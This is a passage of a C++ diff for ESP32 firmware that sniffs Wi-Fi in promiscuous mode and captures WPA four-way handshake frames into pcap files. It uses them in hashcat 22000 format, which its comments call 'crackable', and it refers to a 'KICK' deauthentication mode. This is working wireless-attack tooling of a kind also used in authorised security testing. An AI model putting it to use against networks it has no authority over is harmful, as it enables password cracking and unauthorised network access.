+    snprintf(currentBssid, sizeof(currentBssid),
+             "%02X:%02X:%02X:%02X:%02X:%02X",
+             bssid[0], bssid[1], bssid[2],
+             bssid[3], bssid[4], bssid[5]);
+    if (strcmp(s_cnt.currentBssid, currentBssid) != 0)
+        s_cnt.currentSsid[0] = '\0';
+    memcpy(s_cnt.currentBssid, currentBssid, sizeof(currentBssid));
+    if (ssid && ssid[0]) {
+        strncpy(s_cnt.currentSsid, ssid, sizeof(s_cnt.currentSsid) - 1);
+        s_cnt.currentSsid[sizeof(s_cnt.currentSsid) - 1] = '\0';
+    } else if (force) {
+        s_cnt.currentSsid[0] = '\0';
+    }
+}
+
+static void ssidForBssid(const uint8_t* bssid, char out[33]) {
+    out[0] = '\0';
+    BeaconSlot beacon;
+    if (!copyBeacon(bssid, beacon)) return;
+    if (beacon.ssid[0]) {
+        strncpy(out, beacon.ssid, 32);
+        out[32] = '\0';
+        return;
+    }
+    CapName::ssidFromMgmt(beacon.frame, beacon.len, out);
+}
+
+// Bottom-bar focus: 0=SCAN 1=LOCK 2=HS 3=PIN 4=KICK
+static void setBarTarget(uint8_t mode, const uint8_t* bssid, const char* ssidHint) {
+    s_cnt.targetMode = mode;
+    if (isZeroMac(bssid)) {
+        s_cnt.targetBssid[0] = '\0';
+        s_cnt.targetSsid[0] = '\0';
+        return;
+    }
+    snprintf(s_cnt.targetBssid, sizeof(s_cnt.targetBssid),
+             "%02X:%02X:%02X:%02X:%02X:%02X",
+             bssid[0], bssid[1], bssid[2],
+             bssid[3], bssid[4], bssid[5]);
+    if (ssidHint && ssidHint[0]) {
+        strncpy(s_cnt.targetSsid, ssidHint, sizeof(s_cnt.targetSsid) - 1);
+        s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
+    } else {
+        char ssid[33];
+        ssidForBssid(bssid, ssid);
+        if (ssid[0]) {
+            strncpy(s_cnt.targetSsid, ssid, sizeof(s_cnt.targetSsid) - 1);
+            s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
+        } else if (mode == 3 && s_pinSsid[0]) {
+            strncpy(s_cnt.targetSsid, s_pinSsid, sizeof(s_cnt.targetSsid) - 1);
+            s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
+        } else {
+            // Name unknown вЂ” never show MAC (confusing). Placeholder only.
+            strncpy(s_cnt.targetSsid, "?", sizeof(s_cnt.targetSsid) - 1);
+            s_cnt.targetSsid[sizeof(s_cnt.targetSsid) - 1] = '\0';
+        }
+    }
+}
+
+static void clearBarTarget() {
+    s_cnt.targetMode = 0;
+    s_cnt.targetSsid[0] = '\0';
+    s_cnt.targetBssid[0] = '\0';
+}
+
+static void storeBeacon(const uint8_t* bssid, const uint8_t* f, uint16_t len, int8_t rssi) {
+    if (!bssid || !f || len < 24) return;
+    if (len > BEACON_MAX) len = BEACON_MAX;
+    char ssid[33];
+    CapName::ssidFromMgmt(f, len, ssid);
+
+    char storedSsid[33] = {};
+    bool learned = false;
+    bool found = false;
+    portENTER_CRITICAL(&s_beaconMux);
+    if (!s_running || !s_beacons) {
+        portEXIT_CRITICAL(&s_beaconMux);
+        return;
+    }
+    for (uint8_t i = 0; i < s_beaconCount; i++) {
+        if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
+            memcpy(s_beacons[i].frame, f, len);
+            s_beacons[i].len = len;
+            s_beacons[i].channel = s_cnt.currentChannel;
+            s_beacons[i].rssi = rssi;
+            s_beacons[i].pmfCapable = beaconHasPmf(f, len);
+            learned = ssid[0] && !s_beacons[i].ssid[0];
+            if (ssid[0]) strncpy(s_beacons[i].ssid, ssid, sizeof(s_beacons[i].ssid) - 1);
+            if (learned) s_beacons[i].processed = false;
+            strncpy(storedSsid, s_beacons[i].ssid, sizeof(storedSsid) - 1);
+            found = true;
+            break;
+        }
+    }
+    if (!found) {
+        uint8_t idx;
+        if (s_beaconCount < BEACON_SLOTS) {
+            idx = s_beaconCount++;
+        } else {
+            idx = s_beaconClock++ % BEACON_SLOTS;
+        }
+        memset(&s_beacons[idx], 0, sizeof(s_beacons[idx]));
+        memcpy(s_beacons[idx].bssid, bssid, 6);
+        memcpy(s_beacons[idx].frame, f, len);
+        s_beacons[idx].len = len;
+        s_beacons[idx].channel = s_cnt.currentChannel;
+        s_beacons[idx].rssi = rssi;
+        s_beacons[idx].pmfCapable = beaconHasPmf(f, len);
+        s_beacons[idx].processed = false;
+        if (ssid[0]) strncpy(s_beacons[idx].ssid, ssid, sizeof(s_beacons[idx].ssid) - 1);
+        strncpy(storedSsid, s_beacons[idx].ssid, sizeof(storedSsid) - 1);
+    }
+    portEXIT_CRITICAL(&s_beaconMux);
+
+    if (learned) {
+        portENTER_CRITICAL(&s_pendingMux);
+        memcpy(s_pendingLearnBssid, bssid, 6);
+        s_pendingLearn = true;
+        portEXIT_CRITICAL(&s_pendingMux);
+    }
+    if (ssid[0] && memcmp(bssid, s_lastHsBssid, 6) == 0) {
+        strncpy(s_cnt.lastHsSsid, ssid, sizeof(s_cnt.lastHsSsid) - 1);
+        s_cnt.lastHsSsid[sizeof(s_cnt.lastHsSsid) - 1] = '\0';
+        noteNetwork(bssid, ssid, true);
+    } else if (!hopLocked()) {
+        noteNetwork(bssid, storedSsid, false);
+    }
+    // Checklist: Beacon stored, processed from loop
+}
+
+static void IRAM_ATTR promiscuousRxCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
+    if (!pkt || !s_running) return;
+
+    uint16_t len = pkt->rx_ctrl.sig_len;
+    if (len > 4) len -= 4;
+    if (len < 24) return;
+
+    s_cnt.framesSeen++;
+    const uint8_t* f = pkt->payload;
+
+    if (type == WIFI_PKT_MGMT) {
+        uint8_t fc = f[0] & 0xFC;
+        if (fc == 0x80 || fc == 0x50) {
+            storeBeacon(f + 16, f, len, (int8_t)pkt->rx_ctrl.rssi);
+        } else if (fc == 0x10) {
+            // Checklist: Probe response queued from loop
+        }
+        return;
+    }
+    if (type != WIFI_PKT_DATA) return;
+    if ((f[0] & 0x0C) != 0x08) return;
+
+    uint8_t toDs = (f[1] & 0x01) != 0;
+    uint8_t fromDs = (f[1] & 0x02) != 0;
+
+    const uint8_t* bssid = nullptr;
+    const uint8_t* station = nullptr;
+    uint16_t bodyOff = 24;
+    if (toDs && !fromDs) {
+        bssid   = f + 4;
+        station = f + 10;
+    } else if (!toDs && fromDs) {
+        bssid   = f + 10;
+        station = f + 4;
+    } else if (toDs && fromDs) {
+        // WDS / 4-address вЂ” Porkchop still looks for EAPOL here.
+        bssid   = f + 16;
+        station = f + 10;
+        bodyOff = 30;
+    } else {
+        bssid   = f + 16;
+        station = f + 10;
+    }
+
+    uint8_t subtype = (f[0] >> 4) & 0x0F;
+    bool isQos = (subtype & 0x08) != 0;
+    if (isQos) bodyOff += 2;
+    if (isQos && (f[1] & 0x80)) bodyOff += 4;
+
+    if (bssid && station) noteClient(bssid, station);
+
+    bool eapol = false;
+    if (bodyOff + 8 <= len &&
+               f[bodyOff] == 0xAA && f[bodyOff + 1] == 0xAA &&
+               f[bodyOff + 2] == 0x03 && f[bodyOff + 6] == 0x88 &&
+               f[bodyOff + 7] == 0x8E) {
+        eapol = true;
+    }
+    // DATA ACT (RADIO): count non-EAPOL data toward BeaconSlot::dataRecent
+    // so FOCUS can score real traffic instead of beacon-only activity.
+    if (!eapol && s_dataAct && bssid) {
+        portENTER_CRITICAL(&s_beaconMux);
+        if (s_running && s_beacons) {
+            for (uint8_t i = 0; i < s_beaconCount; i++) {
+                if (memcmp(s_beacons[i].bssid, bssid, 6) == 0) {
+                    if (s_beacons[i].dataRecent < 0xFFFF) s_beacons[i].dataRecent++;
+                    break;
+                }
+            }
+        }
+        portEXIT_CRITICAL(&s_beaconMux);
+    }
+    if (!eapol) return;
+    if (s_pinOk && bssid && memcmp(bssid, s_pinBssid, 6) != 0) return;
+
+    s_cnt.framesEapol++;
+    // Only arm/refresh the lock for a target we're still actually chasing.
+    // "Chasing" now respects HS DEPTH (RADIO menu): at the default depth
+    // (0) this is just hasPair() as before (M1+M2, already crackable). At
+    // depth 1/2 we keep the lock/kick going past that point specifically
+    // to pull in M3 and/or M4 too, instead of releasing the moment the
+    // pair alone is ready.
+    bool stillChasing = bssid && bssid[0] != 0 &&
+                        !isSessionSkipped(bssid) &&
+                        !Hc22000::hasHandshake(bssid, s_hsDepth);
+    if (s_lockOnHs && s_lockMs > 0 && stillChasing) {
+        s_lockUntil = millis() + s_lockMs;
+    }
+    // Porkchop-style: arm lock-on-BSSID so we don't hop away from this
+    // AP's channel before M2 (and, per HS DEPTH, M3/M4) arrive.
+    // Hc22000::hasHandshake() releases the lock early once that depth is
+    // met; lockStreakExpired() is the hard backstop if it never is (e.g.
+    // our own kicks keep interrupting the handshake, so it never
+    // completes and M1 just keeps retransmitting forever).
+    if (s_lockOnHs && s_lockMs > 0 && stillChasing) {
+        armLockOnBssid(bssid, s_cnt.currentChannel);
+    }
+
+    uint8_t next = (uint8_t)((s_write + 1) % s_ringSlots);
+    if (next == s_read) {
+        s_cnt.framesDropped++;
+        s_cnt.eapolDropped++;
+        return;
+    }
+    Slot& s = s_ring[s_write];
+    memcpy(s.bssid, bssid, 6);
+    memcpy(s.station, station, 6);
+    s.originalLen = len;                              // preserve on-air size
+    s.len = (len > EAPOL_FRAME_MAX) ? EAPOL_FRAME_MAX : len;  // clamp for our buffer
+    if (len > EAPOL_FRAME_MAX) s_cnt.framesTruncated++;
+    s.ts  = millis();
+    s.rssi = (int8_t)pkt->rx_ctrl.rssi;
+    s.channel = s_cnt.currentChannel;
+    memcpy(s.frame, f, s.len);
+    s_write = next;
+    s_cnt.framesQueued++;
+}
+
+// Preferred name: SSID_AABBCCDDEEFF.pcap (readable).
+// BSSID always in the stem so one AP = one logical capture.
+// Unknown SSID -> HIDDEN_AABBCCDDEEFF.pcap; SSID-learn renames later.
+// Append-only open below never truncates a good file.
+static void makeFilename(const uint8_t* bssid, char out[Storage::FILE_NAME_MAX]) {
+    if (!out) return;
+    if (!bssid) {
+        snprintf(out, Storage::FILE_NAME_MAX, "UNKNOWN.pcap");
+        return;
+    }
+    char ssid[33];
+    ssidForBssid(bssid, ssid);
+    char stem[40];
+    CapName::buildStem(ssid, bssid, stem, sizeof(stem));
+    snprintf(out, Storage::FILE_NAME_MAX, "%s.pcap", stem);
+}
+
+// Fold pure-MAC / HIDDEN_* leftovers into the preferred path (SSID when known).
+// Never overwrites an existing preferred file that already has data.
+static void migrateLegacyPcapName(const uint8_t* bssid, const char* preferredPath) {
+    if (!bssid || !preferredPath) return;
+    if (SD.exists(preferredPath)) {
+        File p = SD.open(preferredPath, "r");
+        size_t sz = p ? p.size() : 0;
+        if (p) p.close();
+        if (sz >= sizeof(Pcap::FileHeader)) return; // preferred already good
+    }
+
+    char stem[40];
+    char legName[Storage::FILE_NAME_MAX];
+    char legPath[80];
+    size_t bestSz = 0;
+    char bestPath[80] = {0};
+
+    auto consider = [&](const char* path) {
+        if (!path || !path[0] || !SD.exists(path)) return;
+        if (strcmp(path, preferredPath) == 0) return;
+        File f = SD.open(path, "r");
+        size_t sz = f ? f.size() : 0;
+        if (f) f.close();
+        if (sz > bestSz) {
+            bestSz = sz;
+            strncpy(bestPath, path, sizeof(bestPath) - 1);
+            bestPath[sizeof(bestPath) - 1] = '\0';
+        }
+    };
+
+    // pure MAC AABBCCDDEEFF.pcap (previous patch)
+    snprintf(legName, sizeof(legName),
+             "%02X%02X%02X%02X%02X%02X.pcap",
+             bssid[0], bssid[1], bssid[2],
+             bssid[3], bssid[4], bssid[5]);
+    snprintf(legPath, sizeof(legPath), "%s%s", PREFIX, legName);
+    consider(legPath);
+
+    // HIDDEN_MAC
+    CapName::buildStem("", bssid, stem, sizeof(stem));
+    snprintf(legName, sizeof(legName), "%s.pcap", stem);
+    snprintf(legPath, sizeof(legPath), "%s%s", PREFIX, legName);
+    consider(legPath);
+
+    if (!bestPath[0] || bestSz == 0) return;
+    if (SD.exists(preferredPath)) {
+        // preferred exists but was tiny/corrupt path вЂ” don't clobber with rename
+        File p = SD.open(preferredPath, "r");
+        size_t psz = p ? p.size() : 0;
+        if (p) p.close();
+        if (psz >= sizeof(Pcap::FileHeader)) return;
+        if (psz > 0 && psz < sizeof(Pcap::FileHeader)) SD.remove(preferredPath);
+        else if (psz >= sizeof(Pcap::FileHeader)) return;
+    }
+    if (SD.rename(bestPath, preferredPath)) {
+        Serial.printf("[CAP] migrate pcap -> %s (%u bytes)\n",
+                      Storage::baseName(preferredPath), (unsigned)bestSz);
+    }
+}
+
+static void closeFile();
+
+static bool writePcapPacket(const uint8_t* frame, uint16_t flen, uint32_t ts,
+                             uint8_t ch, int8_t rssi, uint16_t origFlen = 0) {
+    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
+    uint8_t rtLen = Pcap::buildRadiotap(rt, ch ? ch : s_cnt.currentChannel, rssi, s_fatPcap);
+    Pcap::PacketHeader ph;
+    ph.tsSec   = ts / 1000;
+    ph.tsUsec  = (ts % 1000) * 1000;
+    // origLen records the original on-air size (before any clamp),
+    // inclLen is what we actually stored. Both equal when no clamp occurred.
+    ph.inclLen = rtLen + flen;
+    ph.origLen = rtLen + (origFlen ? origFlen : flen);
+    if (s_fileSize + sizeof(ph) + rtLen + flen > s_maxFileSize) return false;
+    size_t n = 0;
+    n += s_file.write((uint8_t*)&ph, sizeof(ph));
+    n += s_file.write(rt, rtLen);
+    n += s_file.write(frame, flen);
+    size_t expect = sizeof(ph) + rtLen + flen;
+    if (n != expect) {
+        // The ESP32 Arduino File API has no portable truncate operation.
+        // Close the stream and refuse further writes in this session rather
+        // than pretending a partially written packet was valid.
+        Serial.printf("[CAP] short pcap write (%u/%u)\n",
+                      (unsigned)n, (unsigned)expect);
+        closeFile();
+        return false;
+    }
+    s_fileSize += expect;
+    return true;
+}
+
+static void closeFile() {
+    if (s_fileOpen) {
+        s_file.flush();
+        s_file.close();
+        s_fileOpen = false;
+    }
+}
+
+static bool isAppendablePcap(File& file, size_t fileSize) {
+    if (fileSize < sizeof(Pcap::FileHeader)) return false;
+
+    uint8_t header[sizeof(Pcap::FileHeader)];
+    if (file.read(header, sizeof(header)) != sizeof(header)) return false;
+    if (header[0] != 0xD4 || header[1] != 0xC3 ||
+        header[2] != 0xB2 || header[3] != 0xA1)
+        return false;
+
+    const uint16_t major = (uint16_t)(header[4] | (header[5] << 8));
+    const uint16_t minor = (uint16_t)(header[6] | (header[7] << 8));
+    const uint32_t snaplen = (uint32_t)header[16] |
+                             ((uint32_t)header[17] << 8) |
+                             ((uint32_t)header[18] << 16) |
+                             ((uint32_t)header[19] << 24);
+    const uint32_t linktype = (uint32_t)header[20] |
+                              ((uint32_t)header[21] << 8) |
+                              ((uint32_t)header[22] << 16) |
+                              ((uint32_t)header[23] << 24);
+    if (major != 2 || minor < 4 || snaplen == 0 ||
+        linktype != 127u)
+        return false;
+
+    size_t offset = sizeof(header);
+    uint8_t discard[64];
+    while (offset < fileSize) {
+        if (fileSize - offset < sizeof(Pcap::PacketHeader)) return false;
+        uint8_t packetHeader[sizeof(Pcap::PacketHeader)];
+        if (file.read(packetHeader, sizeof(packetHeader)) != sizeof(packetHeader))
+            return false;
+        offset += sizeof(packetHeader);
+
+        const uint32_t inclLen = (uint32_t)packetHeader[8] |
+                                 ((uint32_t)packetHeader[9] << 8) |
+                                 ((uint32_t)packetHeader[10] << 16) |
+                                 ((uint32_t)packetHeader[11] << 24);
+        const uint32_t origLen = (uint32_t)packetHeader[12] |
+                                 ((uint32_t)packetHeader[13] << 8) |
+                                 ((uint32_t)packetHeader[14] << 16) |
+                                 ((uint32_t)packetHeader[15] << 24);
+        if (inclLen == 0 || inclLen > origLen || inclLen > snaplen ||
+            inclLen > fileSize - offset)
+            return false;
+
+        uint32_t remaining = inclLen;
+        while (remaining) {
+            size_t chunk = remaining < sizeof(discard) ? remaining : sizeof(discard);
+            if (file.read(discard, chunk) != chunk) return false;
+            remaining -= (uint32_t)chunk;
+        }
+        offset += inclLen;
+    }
+    return offset == fileSize;
+}
+
+static bool locateEapolKey(const Slot& s, const uint8_t*& eapol);
+static uint8_t classifyPendingEapol(const Slot& s);
+static bool replayIncremented(const uint8_t* base, const uint8_t* candidate);
+
+struct ExistingPcapStation {
+    uint8_t station[6];
+    bool haveM1;
+    bool haveM2;
+    bool haveM3;
+    bool haveM4;
+    uint8_t m1Replay[8];
+    uint8_t m2Replay[8];
+    uint8_t m3Replay[8];
+};
+
+static bool hasHandshakeAtDepth(File& file, size_t fileSize,
+                                const uint8_t* bssid, uint8_t depth) {
+    static const uint8_t MAX_TRACKED_STATIONS = 16;
+    ExistingPcapStation stations[MAX_TRACKED_STATIONS] = {};
+    uint8_t stationCount = 0;
+    if (!file.seek(sizeof(Pcap::FileHeader))) return false;
+
+    size_t offset = sizeof(Pcap::FileHeader);
+    uint8_t packet[FRAME_MAX + Pcap::RADIOTAP_FAT_LEN];
+    uint8_t discard[64];
+    while (offset < fileSize) {
+        if (fileSize - offset < sizeof(Pcap::PacketHeader)) return false;
+        uint8_t ph[sizeof(Pcap::PacketHeader)];
+        if (file.read(ph, sizeof(ph)) != sizeof(ph)) return false;
+        offset += sizeof(ph);
+
+        const uint32_t incl = (uint32_t)ph[8] | ((uint32_t)ph[9] << 8) |
+                              ((uint32_t)ph[10] << 16) |
+                              ((uint32_t)ph[11] << 24);
+        if (incl == 0 || incl > fileSize - offset) return false;
+        if (incl > sizeof(packet)) {
+            uint32_t remaining = incl;
+            while (remaining) {
+                size_t chunk = remaining < sizeof(discard) ? remaining : sizeof(discard);
+                if (file.read(discard, chunk) != chunk) return false;
+                remaining -= (uint32_t)chunk;
+            }
+            offset += incl;
+            continue;
+        }
+        if (file.read(packet, incl) != incl) return false;
+        offset += incl;
+
+        if (incl < 8) continue;
+        const uint16_t rtLen = (uint16_t)(packet[2] | (packet[3] << 8));
+        if (rtLen < 8 || rtLen > incl) continue;
+        const uint16_t frameLen = (uint16_t)(incl - rtLen);
+        // Slot::frame is EAPOL_FRAME_MAX bytes now. Frames larger than that
+        // cannot be an EAPOL-Key frame (a real one is ~143..300 B) and the
+        // only thing this scanner looks for is EAPOL, so skipping them is
+        // safe вЂ” and it keeps the copy inside the slot buffer.
+        if (frameLen < 24 || frameLen > EAPOL_FRAME_MAX) continue;
+
+        Slot frameSlot{};
+        frameSlot.len = frameLen;
+        memcpy(frameSlot.frame, packet + rtLen, frameLen);
+        const uint8_t* f = frameSlot.frame;
+        if ((f[0] & 0x0C) != 0x08) continue;
+        const bool toDs = (f[1] & 0x01) != 0;
+        const bool fromDs = (f[1] & 0x02) != 0;
+        const uint8_t* frameBssid = nullptr;
+        const uint8_t* frameStation = nullptr;
+        if (toDs && !fromDs) {
+            frameBssid = f + 4;
+            frameStation = f + 10;
+        } else if (!toDs && fromDs) {
+            frameBssid = f + 10;
+            frameStation = f + 4;
+        } else if (toDs && fromDs) {
+            if (frameLen < 30) continue;
+            frameBssid = f + 16;
+            frameStation = f + 10;
+        } else {
+            frameBssid = f + 16;
+            frameStation = f + 10;
+        }
+        if (memcmp(frameBssid, bssid, 6) != 0) continue;
+        memcpy(frameSlot.bssid, frameBssid, 6);
+        memcpy(frameSlot.station, frameStation, 6);
+
+        const uint8_t message = classifyPendingEapol(frameSlot);
+        if (message == 0) continue;
+        const uint8_t* eapol = nullptr;
+        if (!locateEapolKey(frameSlot, eapol)) continue;
+
+        uint8_t si = 0;
+        while (si < stationCount &&
+               memcmp(stations[si].station, frameStation, 6) != 0) si++;
+        if (si == stationCount) {
+            if (stationCount == MAX_TRACKED_STATIONS) continue;
+            memcpy(stations[si].station, frameStation, 6);
+            stationCount++;
+        }
+        ExistingPcapStation& station = stations[si];
+        const uint8_t* replay = eapol + 9;
+        if (message == 1) {
+            if (!station.haveM1 || memcmp(station.m1Replay, replay, 8) != 0) {
+                memcpy(station.m1Replay, replay, 8);
+                station.haveM1 = true;
+                if (station.haveM2 && memcmp(station.m2Replay, replay, 8) != 0)
+                    station.haveM2 = false;
+                if (station.haveM3 && !replayIncremented(replay, station.m3Replay)) {
+                    station.haveM3 = false;
+                    station.haveM4 = false;
+                }
+            }
+        } else if (message == 2) {
+            if (!station.haveM1) {
+                if (!station.haveM2) {
+                    memcpy(station.m2Replay, replay, 8);
+                    station.haveM2 = true;
+                }
+            } else if (memcmp(station.m1Replay, replay, 8) == 0) {
+                memcpy(station.m2Replay, replay, 8);
+                station.haveM2 = true;
+            }
+        } else if (message == 3) {
+            if (station.haveM1 && station.haveM2 &&
+                memcmp(station.m1Replay, station.m2Replay, 8) == 0 &&
+                replayIncremented(station.m1Replay, replay)) {
+                memcpy(station.m3Replay, replay, 8);
+                station.haveM3 = true;
+            }
+        } else if (message == 4) {
+            if (station.haveM3 && memcmp(station.m3Replay, replay, 8) == 0)
+                station.haveM4 = true;
+        }
+
+        const bool pair = station.haveM1 && station.haveM2 &&
+                          memcmp(station.m1Replay, station.m2Replay, 8) == 0;
+        const bool m3 = pair && station.haveM3 &&
+                        replayIncremented(station.m1Replay, station.m3Replay);
+        const bool m4 = m3 && station.haveM4;
+        if (pair && (depth == 0 || (depth == 1 && m3) ||
+                     (depth >= 2 && m4)))
+            return true;
+    }
+    return false;
+}
+
+static bool openFileForBssid(const uint8_t* bssid) {
+    if (s_fileOpen) closeFile();
+
+    Storage::Stats st = Storage::stats();
+    char name[Storage::FILE_NAME_MAX];
+    makeFilename(bssid, name);
+    char path[80];
+    snprintf(path, sizeof(path), "%s%s", PREFIX, name);
+    char ssid[33];
+    ssidForBssid(bssid, ssid);
+
+    // Fold legacy SSID_/HIDDEN_ names into stable MAC-only path once.
+    migrateLegacyPcapName(bssid, path);
+
+    bool exists = SD.exists(path);
+    // Probe size BEFORE any write open. Append-only for existing captures
+    // (Bruce: never FILE_WRITE-truncate a handshake pcap).
+    // Tiny (< global header) files are corrupt remnants вЂ” only those may be
+    // removed. Anything with a full header is sacred: append or refuse.
+    size_t preSize = 0;
+    if (exists) {
+        File probe = SD.open(path, "r");
+        if (!probe) {
+            Serial.printf("[CAP] cannot inspect existing pcap, refusing capture: %s\n", name);
+            return false;
+        }
+        preSize = probe.size();
+        const bool appendable = preSize >= sizeof(Pcap::FileHeader) &&
+                                isAppendablePcap(probe, preSize);
+        const bool alreadyCaptured = appendable &&
+            hasHandshakeAtDepth(probe, preSize, bssid, s_hsDepth);
+        probe.close();
+        if (preSize > 0 && preSize < sizeof(Pcap::FileHeader)) {
+            Serial.printf("[CAP] removed corrupt %u-byte pcap: %s\n", (unsigned)preSize, name);
+            SD.remove(path);
+            exists = false;
+            preSize = 0;
+        } else if (preSize >= sizeof(Pcap::FileHeader) && !appendable) {
+            Serial.printf("[CAP] existing pcap is invalid, preserving and refusing append: %s (%u bytes)\n",
+                          name, (unsigned)preSize);
+            return false;
+        } else if (alreadyCaptured) {
+            Serial.printf("[CAP] existing pcap already has HS depth %u, skipping %s\n",
+                          (unsigned)s_hsDepth, name);
+            addSkip(bssid);
+            return false;
+        }
+    }
+    if (!exists && st.handshakes >= MAX_FILES) {
+        Serial.println("[CAP] handshake cap (200 files) reached");
+        return false;
+    }
+
+    // Explicit append. Never "w" / FILE_WRITE (truncates on ESP32 SD).
+    s_file = SD.open(path, "a");
+    if (!s_file) return false;
+
+    s_fileSize = s_file.size();
+    // Safety: card said non-empty but open shows smaller вЂ” do not write,
+    // do not remove (protect good data; Bruce-style refuse).
+    if (preSize > 0 && s_fileSize < preSize) {
+        Serial.printf("[CAP] size mismatch (pre=%u open=%u), refuse write: %s\n",
+                      (unsigned)preSize, (unsigned)s_fileSize, name);
+        s_file.close();
+        return false;
+    }
+    s_fileOpen = true;
+    memcpy(s_fileBssid, bssid, sizeof(s_fileBssid));
+    strncpy(s_fileName, name, sizeof(s_fileName) - 1);
+    s_fileName[sizeof(s_fileName) - 1] = '\0';
+    // If we believed the file was empty but open shows data, trust disk:
+    // never write a second global header into an existing stream.
+    if (preSize == 0 && s_fileSize > 0) {
+        preSize = s_fileSize;
+    }
+    bool createdNew = false;
+    if (s_fileSize >= s_maxFileSize) {
+        closeFile();
+        if (memcmp(s_fullLoggedBssid, bssid, 6) != 0) {
+            Serial.printf("[CAP] pcap at cap (%u bytes), skipping %s\n",
+                          (unsigned)s_fileSize, name);
+            memcpy(s_fullLoggedBssid, bssid, 6);
+        }
+        return false;
+    }
+    if (memcmp(s_fullLoggedBssid, bssid, 6) != 0) {
+        memset(s_fullLoggedBssid, 0, sizeof(s_fullLoggedBssid));
+    }
+
+    // Only brand-new empty files get a header. If preSize or s_fileSize
+    // indicates any prior bytes, never rewrite header (would corrupt /
+    // look like a "zeroed" capture after a bad reopen).
+    if (s_fileSize == 0 && preSize == 0) {
+        Pcap::FileHeader fh;
+        fh.magic        = 0xA1B2C3D4;
+        fh.versionMajor = 2;
+        fh.versionMinor = 4;
+        fh.thiszone     = 0;
+        fh.sigfigs      = 0;
+        fh.snaplen      = 65535;
+        fh.linktype     = 127;
+        if (s_file.write((uint8_t*)&fh, sizeof(fh)) != sizeof(fh)) {
+            closeFile();
+            // Only remove if we created an empty/new failure вЂ” not a prior good file.
+            if (SD.exists(path)) {
+                File chk = SD.open(path, "r");
+                size_t cz = chk ? chk.size() : 0;
+                if (chk) chk.close();
+                if (cz < sizeof(Pcap::FileHeader)) SD.remove(path);
+            }
+            return false;
+        }
+        s_fileSize = sizeof(fh);
+        s_cnt.filesOpened++;
+        createdNew = true;
+        XP::addXP(XPEvent::HANDSHAKE);
+    } else if (preSize >= sizeof(Pcap::FileHeader)) {
+        // Existing good capture вЂ” append path. Log once per BSSID per boot.
+        static uint8_t s_keptLog[6] = {0};
+        if (memcmp(s_keptLog, bssid, 6) != 0) {
+            Serial.printf("[CAP] keep/append existing pcap %s (%u bytes)\n",
+                          name, (unsigned)s_fileSize);
+            memcpy(s_keptLog, bssid, 6);
+        }
+    }
+    if (ssid[0]) CapName::writeCompanionSsid(Storage::DIR_HS, name, ssid);
+
+    BeaconSlot beacon;
+    if (copyBeacon(bssid, beacon) && (createdNew || s_fileSize < 80)) {
+        writePcapPacket(beacon.frame, beacon.len, millis(), beacon.channel, beacon.rssi);
+        Hc22000::feed(beacon.frame, beacon.len);
+    }
+    return true;
+}
+
+static bool sameBssid(const uint8_t* a, const uint8_t* b) {
+    return memcmp(a, b, 6) == 0;
+}
+
+static bool locateEapolKey(const Slot& s, const uint8_t*& eapol) {
+    const uint8_t* f = s.frame;
+    if (s.len < 24 || (f[0] & 0x0C) != 0x08) return false;
+    uint32_t off = 24;
+    uint8_t subtype = (uint8_t)((f[0] >> 4) & 0x0F);
+    if ((f[1] & 0x03) == 0x03) off += 6;
+    if (subtype & 0x08) off += 2;
+    if ((subtype & 0x08) && (f[1] & 0x80)) off += 4;
+    if (off + 8 + 4 + 95 > s.len) return false;
+    if (f[off] != 0xAA || f[off + 1] != 0xAA ||
+        f[off + 2] != 0x03 || f[off + 6] != 0x88 ||
+        f[off + 7] != 0x8E) return false;
+    eapol = f + off + 8;
+    uint16_t eapolLen = (uint16_t)((eapol[2] << 8) | eapol[3]);
+    if ((eapol[0] != 1 && eapol[0] != 2) || eapol[1] != 3 ||
+        eapolLen < 95 || (uint32_t)eapolLen + 4 > s.len - off - 8)
+        return false;
+    return true;
+}
+
+static uint8_t classifyPendingEapol(const Slot& s) {
+    const uint8_t* e = nullptr;
+    if (!locateEapolKey(s, e)) return 0;
+    uint16_t keyInfo = (uint16_t)((e[5] << 8) | e[6]);
+    bool keyAck = (keyInfo & (1u << 7)) != 0;
+    bool keyMic = (keyInfo & (1u << 8)) != 0;
+    bool install = (keyInfo & (1u << 6)) != 0;
+    bool secure = (keyInfo & (1u << 9)) != 0;
+    if (keyAck && !keyMic) return 1;
+    if (!keyAck && keyMic && !secure) return 2;
+    if (keyAck && keyMic && install) return 3;
+    if (!keyAck && keyMic && secure) return 4;
+    return 0;
+}
+
+static PendingCapture* pendingFor(const Slot& s) {
+    for (uint8_t i = 0; i < s_pendingSlots; i++) {
+        if (s_pending[i].used &&
+            sameBssid(s_pending[i].bssid, s.bssid) &&
+            sameBssid(s_pending[i].station, s.station)) {
+            return &s_pending[i];
+        }
+    }
+    for (uint8_t i = 0; i < s_pendingSlots; i++) {
+        if (!s_pending[i].used) {
+            memset(&s_pending[i], 0, sizeof(s_pending[i]));
+            s_pending[i].used = true;
+            memcpy(s_pending[i].bssid, s.bssid, 6);
+            memcpy(s_pending[i].station, s.station, 6);
+            return &s_pending[i];
+        }
+    }
+    return nullptr;
+}
+
+static void extractReplay(const Slot& s, uint8_t replay[8]) {
+    const uint8_t* e = nullptr;
+    if (locateEapolKey(s, e)) {
+        memcpy(replay, e + 9, 8);
+    } else {
+        memset(replay, 0, 8);
+    }
+}
+
+static bool replayIncremented(const uint8_t* base, const uint8_t* candidate) {
+    if (!base || !candidate) return false;
+    uint8_t expected[8];
+    memcpy(expected, base, sizeof(expected));
+    for (int i = 7; i >= 0; i--) {
+        if (++expected[i] != 0) break;
+    }
+    return memcmp(expected, candidate, sizeof(expected)) == 0;
+}
+
+static void expireStalePending(uint32_t now) {
+    const uint8_t timeoutSec = Config::radio().pendingTimeoutSec;
+    if (timeoutSec == 0) return;
+    const uint32_t timeoutMs = (uint32_t)timeoutSec * 1000u;
+    for (uint8_t i = 0; i < s_pendingSlots; i++) {
+        PendingCapture& p = s_pending[i];
+        if (!p.used || now - p.lastSeenMs < timeoutMs) continue;
+        Serial.printf("[HS] expired incomplete capture %02X:%02X:%02X:%02X:%02X:%02X / %02X:%02X:%02X:%02X:%02X:%02X\n",
